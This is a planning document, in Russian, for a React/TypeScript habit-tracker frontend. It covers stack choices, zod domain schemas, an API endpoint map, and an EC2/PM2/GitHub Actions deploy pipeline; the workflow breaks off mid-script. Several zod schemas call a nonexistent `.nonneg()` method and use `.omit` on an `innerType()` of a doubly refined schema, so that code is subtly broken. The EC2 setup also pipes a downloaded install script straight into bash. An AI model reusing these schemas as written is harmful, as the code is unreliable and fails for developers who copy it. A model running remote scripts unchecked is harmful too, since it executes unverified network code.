# План фронтенд-части Habit Tracker

**Статус:** `pending approval`
**Workdir:** `/Users/user/www/projects/ht-frontend`
**Дата:** 2026-05-23

---

## Содержание

1. [Зафиксированные вводные](#1-зафиксированные-вводные)
2. [Principles](#2-principles)
3. [Decision Drivers](#3-decision-drivers)
4. [Viable Options и инвалидация](#4-viable-options-и-их-инвалидация)
5. [Архитектура решения](#5-архитектура-решения)
6. [Domain types — все сущности](#6-domain-types--все-сущности)
7. [CI/CD pipeline (без Docker)](#7-cicd-pipeline-без-docker)
8. [Pre-mortem](#8-pre-mortem)
9. [Test plan](#9-test-plan)
10. [Roadmap](#10-roadmap)
11. [ADR](#11-adr)
12. [Open questions](#12-open-questions)

---

## 1. Зафиксированные вводные

| Категория    | Решение                                                                                     |
| ------------ | ------------------------------------------------------------------------------------------- |
| UI stack     | React 19 + TypeScript + Tailwind v4 + shadcn/ui                                             |
| Client state | Zustand (UI/client state only)                                                              |
| Server state | TanStack Query v5                                                                           |
| Build / dev  | Vite 7                                                                                      |
| Routing      | TanStack Router (file-based, type-safe)                                                     |
| Forms        | react-hook-form + zod (`@hookform/resolvers`)                                               |
| Data source  | REST API (отдельный backend)                                                                |
| Auth         | OAuth/OIDC (Google) — **BFF-паттерн на бэке, фронт работает с httpOnly cookie** (см. ADR-2) |
| MVP scope    | Habit CRUD + ежедневные отметки + streaks + GitHub-style heatmap + статистика/графики       |
| Theming      | next-themes (light/dark, system)                                                            |
| i18n         | i18next + react-i18next (RU + EN), детект из браузера, persist в localStorage               |
| Charts       | recharts                                                                                    |
| Mobile       | Responsive (mobile-first breakpoints), без PWA                                              |
| Tests        | Vitest + React Testing Library + MSW для API-моков                                          |
| Deploy       | EC2 (port 8000) за ALB, CI/CD через GH Actions + SSH, без Docker                            |

---

## 2. Principles

1. **Server state ≠ client state.** Всё, что приходит с API, живёт в TanStack Query. Zustand хранит только эфемерный UI (модалки, фильтры, выбранная дата).
2. **Type-safety end-to-end.** Все DTO описаны zod-схемами, типы выводятся через `z.infer`. Никаких ручных `type` для API-ответов.
3. **Колокация фич.** Папка фичи содержит свои api, hooks, components, types, schemas. Глобальный `src/shared` — только примитивы и shadcn.
4. **Дамп-сервер тонкий, smart-логика на клиенте — компромисс.** Streak/aggregation считаем на бэке (источник правды), heatmap раскрашиваем на клиенте из плоской истории.
5. **Один путь для каждой задачи.** Один HTTP-клиент, один шаблон query/mutation хука, один шаблон формы — чтобы новый разработчик не выбирал между 3 вариантами.

---

## 3. Decision Drivers

1. **Time-to-MVP при качестве.** Greenfield, нужно быстро собрать рабочий продукт без техдолга.
2. **Безопасность auth.** OAuth в SPA — частый источник уязвимостей (XSS → токены в localStorage). Нужен безопасный паттерн по умолчанию.
3. **Простота операции и деплоя.** EC2 + git pull — низкоуровневый сетап, не должен ломаться от типичных проблем (build OOM, миграции зависимостей, потерянная сессия SSH).

---

## 4. Viable Options и их инвалидация

### 4.1. State management

| Опция                                       | Pros                                                                                        | Cons                                                                                                                 | Решение        |
| ------------------------------------------- | ------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------- | -------------- |
| **A. TanStack Query + Zustand (раздельно)** | Чёткая граница server/client; кэш, retries, dedupe из коробки; persist Zustand для UI prefs | 2 библиотеки, нужно дисциплинированно не мешать                                                                      | Выбрана        |
| B. Только Zustand + fetch                   | Минимум зависимостей                                                                        | Перепридумываем кэш, optimistic updates, race conditions; для habit-tracker с частыми toggle-операциями это критично | Инвалидирована |
| C. Redux Toolkit + RTK Query                | Стандарт энтерпрайза                                                                        | Boilerplate выше Zustand; нет преимуществ для нашего объёма                                                          | Overkill       |

### 4.2. Auth flow

| Опция                                                              | Pros                                                                                                             | Cons                                                             | Решение         |
| ------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------- | --------------- |
| **A. BFF: backend хранит OAuth токены, отдаёт httpOnly cookie**    | Токены недоступны JS → защита от XSS; CSRF закрывается SameSite=Lax + Origin check; на фронте нет логики refresh | Бэкенд должен поддержать                                         | Выбрана — ADR-2 |
| B. PKCE flow на фронте, токен в memory + refresh в httpOnly cookie | Не нужна доработка бэка под BFF                                                                                  | Сложнее: silent refresh, race на 401, рестор сессии после reload | Инвалидирована  |
| C. Токен в localStorage                                            | Просто                                                                                                           | XSS = слив всех токенов                                          | Анти-паттерн    |

### 4.3. Структура проекта

| Опция                                                                       | Решение                                  |
| --------------------------------------------------------------------------- | ---------------------------------------- |
| **A. Feature-folders:** `src/features/*` + `src/shared/{ui,api,lib,config}` | Выбрана                                  |
| B. Полный Feature-Sliced Design (FSD)                                       | Слишком формальный для команды на старте |
| C. По типам (`components/`, `hooks/`, `pages/`)                             | Не масштабируется                        |

---

## 5. Архитектура решения

### 5.1. Структура каталогов

```
ht-frontend/
├── public/
├── src/
│   ├── app/
│   │   ├── providers.tsx        # QueryClient, ThemeProvider, i18n, RouterProvider
│   │   ├── router.tsx           # TanStack Router root
│   │   └── error-boundary.tsx
│   ├── routes/                  # TanStack Router file-based
│   │   ├── __root.tsx
│   │   ├── _authenticated/      # layout-route с auth guard
│   │   │   ├── route.tsx
│   │   │   ├── index.tsx        # / → Today
│   │   │   ├── habits.tsx       # /habits
│   │   │   ├── habits.$id.tsx   # /habits/:id (детально + heatmap)
│   │   │   ├── stats.tsx        # /stats
│   │   │   └── settings.tsx
│   │   ├── login.tsx
│   │   └── auth.callback.tsx    # обработка возврата с OAuth
│   ├── features/
│   │   ├── habits/
│   │   │   ├── api.ts
│   │   │   ├── schemas.ts
│   │   │   ├── hooks/
│   │   │   │   ├── use-habits.ts
│   │   │   │   ├── use-toggle-entry.ts
│   │   │   │   └── use-habit-mutations.ts
│   │   │   ├── components/
│   │   │   │   ├── habit-card.tsx
│   │   │   │   ├── habit-form.tsx
│   │   │   │   └── habit-list.tsx
│   │   │   └── types.ts
│   │   ├── entries/
│   │   ├── streaks/
│   │   ├── heatmap/
│   │   ├── stats/
│   │   └── auth/
│   │       ├── api.ts
│   │       ├── hooks.ts
│   │       └── components/login-button.tsx
│   ├── shared/
│   │   ├── ui/                  # shadcn primitives
│   │   ├── api/
│   │   │   ├── client.ts        # ky instance: credentials:'include'
│   │   │   ├── errors.ts
│   │   │   ├── primitives.ts    # branded типы и общие zod-схемы
│   │   │   ├── query-keys.ts
│   │   │   └── query-client.ts
│   │   ├── lib/
│   │   │   ├── date.ts          # TZ-aware helpers
│   │   │   ├── cn.ts
│   │   │   └── i18n.ts
│   │   ├── config/
│   │   │   ├── env.ts           # zod-валидированные envs
│   │   │   └── constants.ts
│   │   └── stores/              # Zustand stores (UI only)
│   │       ├── ui-store.ts
│   │       └── prefs-store.ts
│   ├── locales/
│   │   ├── ru/common.json
│   │   └── en/common.json
│   └── main.tsx
├── tests/
│   ├── setup.ts
│   ├── msw/handlers.ts
│   └── utils/render.tsx
├── .github/workflows/deploy.yml
├── ecosystem.config.cjs         # PM2
├── index.html
├── vite.config.ts
├── tailwind.config.ts
├── tsconfig.json
└── package.json
```

### 5.2. Data flow (один путь)

```
UI компонент
   ↓ хук useHabits()
TanStack Query (cache, dedupe, retry)
   ↓ habitsApi.list()
HTTP клиент (ky, credentials:'include')
   ↓
REST API (бэкенд)
   ↑ JSON, валидация через zod schemas
   ↑ типы выведены через z.infer
```

Mutations всегда возвращают свежие данные → `queryClient.invalidateQueries({ queryKey: ['habits'] })`. Для отметок выполнения — optimistic update + rollback по onError.

### 5.3. Auth flow (BFF)

```
1. Пользователь → /login → клик "Google"
2. Фронт → редирект на /api/auth/google (бэкенд)
3. Бэкенд → Google OAuth → callback на /api/auth/callback
4. Бэкенд: обменивает code на токены, создаёт session, отдаёт
   Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax
5. Бэкенд → редирект на /auth/callback (фронт)
6. Фронт: TanStack Query вызывает GET /api/auth/me → user
7. Все последующие запросы с credentials:'include'
8. Logout: POST /api/auth/logout → cookie clear → редирект на /login
```

Guard: `_authenticated/route.tsx` использует `beforeLoad`, который дергает `auth.me` query; при 401 → redirect `/login`.

### 5.4. Inventory страниц (MVP)

| Route            | Назначение                           | Ключевые компоненты                                         |
| ---------------- | ------------------------------------ | ----------------------------------------------------------- |
| `/login`         | Кнопка Google login                  | `LoginButton`                                               |
| `/auth/callback` | Обработка возврата                   | Spinner + redirect                                          |
| `/` (Today)      | Список привычек на сегодня, чекбоксы | `HabitCard[]`, `DateSwitcher`                               |
| `/habits`        | Список всех привычек, CRUD           | `HabitList`, `HabitForm` в Dialog                           |
| `/habits/:id`    | Детали привычки + heatmap + streak   | `Heatmap`, `StreakStat`, `EntryNoteList`                    |
| `/stats`         | Дашборд: completion %, тренды        | `CompletionTrendChart`, `WeekdayBreakdown`, `PerHabitTable` |
| `/settings`      | Тема, язык, выход                    | `ThemeToggle`, `LanguageSelect`, `LogoutButton`             |

---

## 6. Domain types — все сущности

Все DTO описаны через `zod` — типы выводятся из схем (`z.infer`), единый источник правды между runtime-валидацией и компайл-тайм типами.

### 6.1. Общие примитивы — `shared/api/primitives.ts`

```ts
import { z } from 'zod';

// Branded типы — защита от перепутывания id-шек на компайл-тайме
export const HabitId = z.string().uuid().brand<'HabitId'>();
export type HabitId = z.infer<typeof HabitId>;

export const EntryId = z.string().uuid().brand<'EntryId'>();
export type EntryId = z.infer<typeof EntryId>;

export const UserId = z.string().uuid().brand<'UserId'>();
export type UserId = z.infer<typeof UserId>;

// Локальная дата пользователя без time-зоны
export const LocalDate = z
  .string()
  .regex(/^\d{4}-\d{2}-\d{2}$/, 'Expected YYYY-MM-DD')
  .brand<'LocalDate'>();
export type LocalDate = z.infer<typeof LocalDate>;

// ISO datetime в UTC (createdAt, archivedAt и т.п.)
export const IsoDateTime = z.string().datetime({ offset: true }).brand<'IsoDateTime'>();
export type IsoDateTime = z.infer<typeof IsoDateTime>;

// Hex цвет: #RGB / #RRGGBB
export const HexColor = z
  .string()
  .regex(/^#([0-9a-fA-F]{3}|[0-9a-fA-F]{6})$/)
  .brand<'HexColor'>();
export type HexColor = z.infer<typeof HexColor>;

// IANA timezone
export const Timezone = z.string().min(1).brand<'Timezone'>();
export type Timezone = z.infer<typeof Timezone>;

// Cursor-пагинация
export const Page = <T extends z.ZodTypeAny>(item: T) =>
  z.object({
    items: z.array(item),
    nextCursor: z.string().nullable(),
    total: z.number().int().nonneg().optional(),
  });
export type Page<T> = { items: T[]; nextCursor: string | null; total?: number };
```

### 6.2. Auth / User — `features/auth/schemas.ts`

```ts
import { z } from 'zod';
import { UserId, IsoDateTime, Timezone } from '@/shared/api/primitives';

export const AuthProvider = z.enum(['google']);
export type AuthProvider = z.infer<typeof AuthProvider>;

export const UserSchema = z.object({
  id: UserId,
  email: z.string().email(),
  name: z.string().min(1),
  avatarUrl: z.string().url().nullable(),
  provider: AuthProvider,
  timezone: Timezone, // IANA, напр. 'Europe/Warsaw'
  locale: z.enum(['ru', 'en']),
  createdAt: IsoDateTime,
});
export type User = z.infer<typeof UserSchema>;

// Ответ GET /auth/me
export const MeResponseSchema = z.object({
  user: UserSchema,
  csrfToken: z.string().optional(),
});
export type MeResponse = z.infer<typeof MeResponseSchema>;

// Статус сессии в UI-сторе (не путать с server state)
export type AuthState =
  | { status: 'idle' }
  | { status: 'loading' }
  | { status: 'authenticated'; user: User }
  | { status: 'unauthenticated' }
  | { status: 'error'; message: string };
```

### 6.3. Habit — `features/habits/schemas.ts`

```ts
import { z } from 'zod';
import { HabitId, HexColor, IsoDateTime } from '@/shared/api/primitives';

export const HabitFrequency = z.enum(['daily', 'weekdays', 'weekends', 'custom']);
export type HabitFrequency = z.infer<typeof HabitFrequency>;

export const Weekday = z.union([
  z.literal(0),
  z.literal(1),
  z.literal(2),
  z.literal(3),
  z.literal(4),
  z.literal(5),
  z.literal(6),
]); // 0 = воскресенье
export type Weekday = z.infer<typeof Weekday>;

export const HabitKind = z.enum(['boolean', 'counter']);
// boolean: сделал/не сделал; counter: цель N раз за день (напр. 8 стаканов воды)
export type HabitKind = z.infer<typeof HabitKind>;

export const HabitSchema = z
  .object({
    id: HabitId,
    title: z.string().min(1).max(100),
    description: z.string().max(500).nullable(),
    color: HexColor,
    icon: z.string().min(1).max(48).nullable(), // имя из lucide-react
    kind: HabitKind,
    targetPerDay: z.number().int().positive(), // для boolean всегда 1
    frequency: HabitFrequency,
    customDays: z.array(Weekday).nullable(), // not-null только при frequency='custom'
    reminderTime: z
      .string()
      .regex(/^([01]\d|2[0-3]):[0-5]\d$/) // HH:mm локальное
      .nullable(),
    sortOrder: z.number().int(),
    createdAt: IsoDateTime,
    archivedAt: IsoDateTime.nullable(),
  })
  .refine((h) => h.frequency !== 'custom' || (h.customDays && h.customDays.length > 0), {
    message: 'customDays required when frequency=custom',
    path: ['customDays'],
  })
  .refine((h) => h.kind === 'counter' || h.targetPerDay === 1, {
    message: 'targetPerDay must be 1 for boolean habits',
    path: ['targetPerDay'],
  });
export type Habit = z.infer<typeof HabitSchema>;

// Payload для POST /habits — без серверных полей
export const CreateHabitInput = HabitSchema.innerType()
  .omit({ id: true, createdAt: true, archivedAt: true, sortOrder: true })
  .extend({
    sortOrder: z.number().int().optional(),
  });
export type CreateHabitInput = z.infer<typeof CreateHabitInput>;

// Payload для PATCH /habits/:id
export const UpdateHabitInput = CreateHabitInput.partial();
export type UpdateHabitInput = z.infer<typeof UpdateHabitInput>;

// Состояние формы (используется RHF)
export type HabitFormValues = CreateHabitInput;
```

### 6.4. Habit Entry (отметки) — `features/entries/schemas.ts`

```ts
import { z } from 'zod';
import { EntryId, HabitId, LocalDate, IsoDateTime } from '@/shared/api/primitives';
import { HabitSchema } from '@/features/habits/schemas';

export const HabitEntrySchema = z.object({
  id: EntryId,
  habitId: HabitId,
  date: LocalDate,
  count: z.number().int().nonneg(), // для boolean: 0 или 1; для counter: 0..targetPerDay+
  note: z.string().max(1000).nullable(),
  createdAt: IsoDateTime,
  updatedAt: IsoDateTime,
});
export type HabitEntry = z.infer<typeof HabitEntrySchema>;

// Тоггл/инкремент: PUT /habits/:id/entries/:date
export const UpsertEntryInput = z.object({
  date: LocalDate,
  count: z.number().int().nonneg(),
  note: z.string().max(1000).optional(),
});
export type UpsertEntryInput = z.infer<typeof UpsertEntryInput>;

// Запрос истории: GET /habits/:id/entries?from=&to=
export const EntriesRangeQuery = z.object({
  habitId: HabitId,
  from: LocalDate,
  to: LocalDate,
});
export type EntriesRangeQuery = z.infer<typeof EntriesRangeQuery>;

// Запись «на сегодня» в Today-view: денормализованный join habit+entry
export const TodayItemSchema = z.object({
  habit: HabitSchema,
  entry: HabitEntrySchema.nullable(),
  isDue: z.boolean(), // показывать сегодня по frequency
});
export type TodayItem = z.infer<typeof TodayItemSchema>;
```

### 6.5. Stats / Streaks — `features/stats/schemas.ts`

```ts
import { z } from 'zod';
import { HabitId, LocalDate } from '@/shared/api/primitives';

export const HabitStatsSchema = z.object({
  habitId: HabitId,
  currentStreak: z.number().int().nonneg(),
  bestStreak: z.number().int().nonneg(),
  totalEntries: z.number().int().nonneg(),
  completionRate7d: z.number().min(0).max(1),
  completionRate30d: z.number().min(0).max(1),
  completionRate365d: z.number().min(0).max(1),
  lastCompletedAt: LocalDate.nullable(),
});
export type HabitStats = z.infer<typeof HabitStatsSchema>;

// Точка для heatmap: дата + уровень (0..4) и сырое значение
export const HeatmapCellSchema = z.object({
  date: LocalDate,
  count: z.number().int().nonneg(),
  level: z.union([z.literal(0), z.literal(1), z.literal(2), z.literal(3), z.literal(4)]),
});
export type HeatmapCell = z.infer<typeof HeatmapCellSchema>;

export const HeatmapResponseSchema = z.object({
  habitId: HabitId,
  from: LocalDate,
  to: LocalDate,
  cells: z.array(HeatmapCellSchema),
});
export type HeatmapResponse = z.infer<typeof HeatmapResponseSchema>;

// Дашборд /stats: агрегаты по всем привычкам пользователя
export const StatsPeriod = z.enum(['7d', '30d', '90d', '365d']);
export type StatsPeriod = z.infer<typeof StatsPeriod>;

export const DashboardSummarySchema = z.object({
  period: StatsPeriod,
  totalHabits: z.number().int().nonneg(),
  activeHabits: z.number().int().nonneg(),
  overallCompletionRate: z.number().min(0).max(1),
  bestStreakAcrossAll: z.number().int().nonneg(),
});
export type DashboardSummary = z.infer<typeof DashboardSummarySchema>;

// Серия для recharts: completion % по дням
export const CompletionTrendPointSchema = z.object({
  date: LocalDate,
  completionRate: z.number().min(0).max(1),
  completed: z.number().int().nonneg(),
  due: z.number().int().nonneg(),
});
export type CompletionTrendPoint = z.infer<typeof CompletionTrendPointSchema>;

export const CompletionTrendSchema = z.object({
  period: StatsPeriod,
  points: z.array(CompletionTrendPointSchema),
});
export type CompletionTrend = z.infer<typeof CompletionTrendSchema>;

// Разрез по дням недели (bar chart)
export const WeekdayBreakdownItemSchema = z.object({
  weekday: z.union([
    z.literal(0),
    z.literal(1),
    z.literal(2),
    z.literal(3),
    z.literal(4),
    z.literal(5),
    z.literal(6),
  ]),
  completionRate: z.number().min(0).max(1),
  totalDue: z.number().int().nonneg(),
});
export type WeekdayBreakdownItem = z.infer<typeof WeekdayBreakdownItemSchema>;

export const WeekdayBreakdownSchema = z.object({
  period: StatsPeriod,
  items: z.array(WeekdayBreakdownItemSchema).length(7),
});
export type WeekdayBreakdown = z.infer<typeof WeekdayBreakdownSchema>;
```

### 6.6. API errors — `shared/api/errors.ts`

```ts
import { z } from 'zod';

export const ApiErrorBodySchema = z.object({
  code: z.string(), // 'habit_not_found', 'validation_error', …
  message: z.string(),
  details: z.record(z.string(), z.unknown()).optional(),
  fieldErrors: z.record(z.string(), z.array(z.string())).optional(), // { title: ['too long'] }
});
export type ApiErrorBody = z.infer<typeof ApiErrorBodySchema>;

export class ApiError extends Error {
  readonly status: number;
  readonly body: ApiErrorBody;
  constructor(status: number, body: ApiErrorBody) {
    super(body.message);
    this.status = status;
    this.body = body;
    this.name = 'ApiError';
  }
}

// Discriminated union для UI: что показать
export type ApiErrorKind =
  | { kind: 'network' }
  | { kind: 'unauthorized' }
  | { kind: 'forbidden' }
  | { kind: 'notFound' }
  | { kind: 'validation'; fieldErrors: Record<string, string[]> }
  | { kind: 'conflict' }
  | { kind: 'rateLimited'; retryAfterSeconds: number | null }
  | { kind: 'server' }
  | { kind: 'unknown'; message: string };
```

### 6.7. Client state (Zustand) — `shared/stores/types.ts`

```ts
import type { HabitId, LocalDate } from '@/shared/api/primitives';

export type Theme = 'light' | 'dark' | 'system';
export type Locale = 'ru' | 'en';

export type PrefsState = {
  theme: Theme;
  locale: Locale;
  setTheme: (t: Theme) => void;
  setLocale: (l: Locale) => void;
};

export type ModalKind =
  | { type: 'none' }
  | { type: 'habit-create' }
  | { type: 'habit-edit'; habitId: HabitId }
  | { type: 'habit-delete-confirm'; habitId: HabitId }
  | { type: 'entry-note'; habitId: HabitId; date: LocalDate };

export type UiState = {
  selectedDate: LocalDate;
  modal: ModalKind;
  sidebarOpen: boolean;
  selectDate: (d: LocalDate) => void;
  openModal: (m: ModalKind) => void;
  closeModal: () => void;
  toggleSidebar: () => void;
};
```

### 6.8. Routing context — `app/router-types.ts`

```ts
import type { QueryClient } from '@tanstack/react-query';
import type { User } from '@/features/auth/schemas';
import type { HabitId } from '@/shared/api/primitives';
import type { StatsPeriod } from '@/features/stats/schemas';

export type RouterContext = {
  queryClient: QueryClient;
  auth: {
    getUser: () => User | null; // sync getter из cache
    requireUser: () => User; // throws redirect to /login
  };
};

// Search params на /habits
export type HabitsSearch = {
  q?: string;
  archived?: boolean;
  sort?: 'createdAt' | 'title' | 'sortOrder';
};

export type StatsSearch = {
  period?: StatsPeriod;
  habitId?: HabitId;
};
```

### 6.9. Env — `shared/config/env.ts`

```ts
import { z } from 'zod';

const EnvSchema = z.object({
  VITE_API_BASE_URL: z.string().url(),
  VITE_PUBLIC_DOMAIN: z.string().min(1),
  VITE_SENTRY_DSN: z.string().url().optional(),
  VITE_BUILD_SHA: z.string().optional(),
  MODE: z.enum(['development', 'production', 'test']),
});

export const env = EnvSchema.parse(import.meta.env);
export type Env = z.infer<typeof EnvSchema>;
```

### 6.10. Query keys — `shared/api/query-keys.ts`

```ts
import type { HabitId, LocalDate } from './primitives';
import type { StatsPeriod } from '@/features/stats/schemas';

export const queryKeys = {
  auth: {
    me: () => ['auth', 'me'] as const,
  },
  habits: {
    all: () => ['habits'] as const,
    list: (params?: { archived?: boolean }) => ['habits', 'list', params ?? {}] as const,
    detail: (id: HabitId) => ['habits', 'detail', id] as const,
    stats: (id: HabitId) => ['habits', id, 'stats'] as const,
    heatmap: (id: HabitId, from: LocalDate, to: LocalDate) =>
      ['habits', id, 'heatmap', from, to] as const,
    entries: (id: HabitId, from: LocalDate, to: LocalDate) =>
      ['habits', id, 'entries', from, to] as const,
  },
  today: {
    list: (date: LocalDate) => ['today', date] as const,
  },
  stats: {
    summary: (period: StatsPeriod) => ['stats', 'summary', period] as const,
    completionTrend: (period: StatsPeriod) => ['stats', 'completion-trend', period] as const,
    weekdayBreakdown: (period: StatsPeriod) => ['stats', 'weekday', period] as const,
  },
} as const;
```

### 6.11. Карта API-эндпоинтов → схемы

| Метод  | Путь                                  | Body schema        | Response schema             |
| ------ | ------------------------------------- | ------------------ | --------------------------- |
| GET    | `/auth/me`                            | —                  | `MeResponseSchema`          |
| GET    | `/auth/google`                        | —                  | redirect (302)              |
| GET    | `/auth/callback`                      | —                  | redirect (302)              |
| POST   | `/auth/logout`                        | —                  | `{ ok: true }`              |
| GET    | `/habits`                             | —                  | `z.array(HabitSchema)`      |
| POST   | `/habits`                             | `CreateHabitInput` | `HabitSchema`               |
| GET    | `/habits/:id`                         | —                  | `HabitSchema`               |
| PATCH  | `/habits/:id`                         | `UpdateHabitInput` | `HabitSchema`               |
| DELETE | `/habits/:id`                         | —                  | `{ ok: true }`              |
| POST   | `/habits/:id/archive`                 | —                  | `HabitSchema`               |
| GET    | `/habits/:id/entries?from&to`         | —                  | `z.array(HabitEntrySchema)` |
| PUT    | `/habits/:id/entries/:date`           | `UpsertEntryInput` | `HabitEntrySchema`          |
| DELETE | `/habits/:id/entries/:date`           | —                  | `{ ok: true }`              |
| GET    | `/habits/:id/stats`                   | —                  | `HabitStatsSchema`          |
| GET    | `/habits/:id/heatmap?from&to`         | —                  | `HeatmapResponseSchema`     |
| GET    | `/today?date=YYYY-MM-DD`              | —                  | `z.array(TodayItemSchema)`  |
| GET    | `/stats/summary?period=7d`            | —                  | `DashboardSummarySchema`    |
| GET    | `/stats/completion-trend?period=30d`  | —                  | `CompletionTrendSchema`     |
| GET    | `/stats/weekday-breakdown?period=30d` | —                  | `WeekdayBreakdownSchema`    |

### 6.12. Инварианты на типах и в zod

1. `frequency='custom'` ⇒ `customDays.length > 0` — `.refine` в `HabitSchema`.
2. `kind='boolean'` ⇒ `targetPerDay === 1` — `.refine` в `HabitSchema`.
3. `count ≤ targetPerDay` для `boolean` (0 или 1) — проверка в `UpsertEntryInput.refine`, опционально на бэке.
4. `LocalDate` branded ≠ `IsoDateTime` branded — компайлер не даст передать одно вместо другого.
5. `HabitId` ≠ `EntryId` ≠ `UserId` — branded, защита от перепутывания в API-хуках.

---

## 7. CI/CD pipeline (без Docker)

### 7.1. Архитектура потока

```
Developer
   │ git push origin main
   ▼
GitHub                                                 GitHub Actions runner
   │ webhook                                           ┌──────────────────────┐
   ▼                                                   │ ci: typecheck/lint/  │
.github/workflows/deploy.yml ─────────────────────────▶│     test/build       │
                                                       └──────────┬───────────┘
                                                                  │ ok
                                                                  ▼
                                                      ┌──────────────────────┐
                                                      │ deploy: ssh-action   │
                                                      └──────────┬───────────┘
                                                                 │ ssh
                                                                 ▼
                                              EC2 (Amazon Linux 2023 / Ubuntu 22.04)
                                              ┌────────────────────────────────────────┐
                                              │ /var/www/ht-frontend  (git work-tree)  │
                                              │   ↓ git fetch && reset --hard          │
                                              │   ↓ npm ci --include=dev               │
                                              │   ↓ npm run build  → dist/             │
                                              │   ↓ pm2 reload ht-frontend             │
                                              │                                        │
                                              │ PM2 daemon                             │
                                              │   └─ ht-frontend: serve dist -s -l 8000│
                                              └───────────────────┬────────────────────┘
                                                                  │ :8000
                                                                  ▼
                                                          ALB target group
                                                                  │
                                                                  ▼ :443 (ACM cert)
                                                          Internet (https://...)
```

Никаких контейнеров — нативные процессы под PM2 на хосте.

### 7.2. Подготовка EC2 (one-time setup)

```bash
# 7.2.1. Базовый софт (Amazon Linux 2023)
sudo dnf update -y
sudo dnf install -y git curl tar gzip rsync

# 7.2.2. Node 22 LTS через nvm под deploy-юзером
sudo useradd -m -s /bin/bash deploy

sudo -iu deploy bash <<'EOS'
  curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash
  source ~/.nvm/nvm.sh
  nvm install 22 --lts
  nvm alias default 22
  npm i -g pm2 serve
EOS

# 7.2.3. systemd-unit для PM2 (чтобы пережил перезагрузку)
sudo -iu deploy bash -c 'pm2 startup systemd -u deploy --hp /home/deploy' \
  | sudo bash

# 7.2.4. Проектная директория и SSH-ключ для git
sudo mkdir -p /var/www/ht-frontend /var/log/ht-frontend
sudo chown -R deploy:deploy /var/www/ht-frontend /var/log/ht-frontend

sudo -iu deploy bash <<'EOS'
  ssh-keygen -t ed25519 -N '' -f ~/.ssh/github_deploy
  # public-ключ → GitHub → Settings → Deploy keys (read-only)
  cat >> ~/.ssh/config <<CFG
Host github.com
  IdentityFile ~/.ssh/github_deploy
  IdentitiesOnly yes
  StrictHostKeyChecking accept-new
CFG
  cd /var/www/ht-frontend
  git clone --depth=20 git@github.com:OWNER/ht-frontend.git .
EOS

# 7.2.5. swap-файл — защита от OOM при npm ci/build на t3.small
sudo dd if=/dev/zero of=/swapfile bs=1M count=2048
sudo chmod 600 /swapfile && sudo mkswap /swapfile && sudo swapon /swapfile
echo '/swapfile swap swap defaults 0 0' | sudo tee -a /etc/fstab

# 7.2.6. log rotation
sudo -iu deploy pm2 install pm2-logrotate
sudo -iu deploy pm2 set pm2-logrotate:max_size 50M
sudo -iu deploy pm2 set pm2-logrotate:retain 14
sudo -iu deploy pm2 set pm2-logrotate:compress true

# 7.2.7. firewall (security group делает основную защиту, локально подстраховка)
sudo dnf install -y firewalld
sudo systemctl enable --now firewalld
sudo firewall-cmd --permanent --add-port=8000/tcp
sudo firewall-cmd --reload
```

**SSH-ключ для GitHub Actions → EC2:**

```bash
# на локальной машине
ssh-keygen -t ed25519 -N '' -f gha_deploy_key -C 'github-actions@ht-frontend'

# public part → /home/deploy/.ssh/authorized_keys на EC2
# private part → GitHub Settings → Secrets → EC2_SSH_KEY
```

### 7.3. PM2 ecosystem — `ecosystem.config.cjs`

```js
module.exports = {
  apps: [
    {
      name: 'ht-frontend',
      script: 'npx',
      args: 'serve dist --single --listen 8000 --no-clipboard --no-port-switching',
      cwd: '/var/www/ht-frontend',
      instances: 1,
      exec_mode: 'fork',
      autorestart: true,
      max_memory_restart: '300M',
      kill_timeout: 8000,
      listen_timeout: 10000,
      env: {
        NODE_ENV: 'production',
      },
      out_file: '/var/log/ht-frontend/out.log',
      error_file: '/var/log/ht-frontend/err.log',
      time: true,
      merge_logs: true,
    },
  ],
};
```

Параметры:

- `--single` (`-s`) — SPA-fallback: любой `404` отдаёт `index.html` (нужно для TanStack Router client-side routing).
- `--no-clipboard --no-port-switching` — не пытаться открыть браузер / сменить порт.
- `max_memory_restart` — защита от утечек.
- `kill_timeout: 8000` — `pm2 reload` сначала шлёт `SIGINT`, ждёт graceful exit.

`pm2 reload` (а не `restart`) даёт zero-downtime: PM2 поднимает новый процесс, ждёт что он жив, потом гасит старый.

### 7.4. GitHub Actions workflow — `.github/workflows/deploy.yml`

```yaml
name: deploy

on:
  push:
    branches: [main]
  workflow_dispatch: {}

concurrency:
  group: deploy-prod
  cancel-in-progress: false

permissions:
  contents: read

jobs:
  ci:
    name: typecheck · lint · test · build
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1

      - uses: actions/setup-node@v4
        with:
          node-version: '22'
          cache: 'npm'

      - run: npm ci --include=dev

      - run: npm run typecheck
      - run: npm run lint
      - run: npm run test -- --run --reporter=dot

      - name: Smoke build (validate prod build passes)
        run: npm run build
        env:
          VITE_API_BASE_URL: https://api.placeholder.invalid
          VITE_PUBLIC_DOMAIN: placeholder.invalid

  deploy:
    name: ssh deploy to EC2
    needs: ci
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://${{ vars.PUBLIC_DOMAIN }}
    timeout-minutes: 10
    steps:
      - name: Deploy via SSH
        uses: appleboy/ssh-action@v1.2.0
        with:
          host: ${{ secrets.EC2_HOST }}
          username: ${{ secrets.EC2_USER }}
          key: ${{ secrets.EC2_SSH_KEY }}
          port: 22
          command_timeout: 8m
          script_stop: true
          script: |
            set -euo pipefail
            export NVM_DIR="$HOME/.nvm"
            # shellcheck disable=SC1091
            source "$NVM_DIR/nvm.sh"
            nvm use default

            cd /var/www/ht-frontend

            echo "::group::git sync"
            git fetch --prune origin main
            PREV_SHA=$(git rev-parse HEAD)
            git reset --hard origin/main
            NEW_SHA=$(git rev-parse HEAD)
            echo "from=$PREV_SHA to=$NEW_SHA"
            echo "::endgroup::"

            echo "::group::install"
            npm ci --include=dev
            echo "::endgroup::"

            echo "::group::build"
            export VITE_BUILD_SHA="$NEW_SHA"
            npm run build
            echo "::endgroup::"

            echo "::group::reload"
            pm2 reload ecosystem.config.cjs --update-env
            pm2 save
            echo "::endgroup::"

            echo "$PREV_SHA" > /var/www/ht-frontend/.previous_sha

      - name: Wait for ALB health
        env:
          DOMAIN: ${{ vars.PUBLIC_DOMAIN }}
        run: |
          for i in $(seq 1 20); do
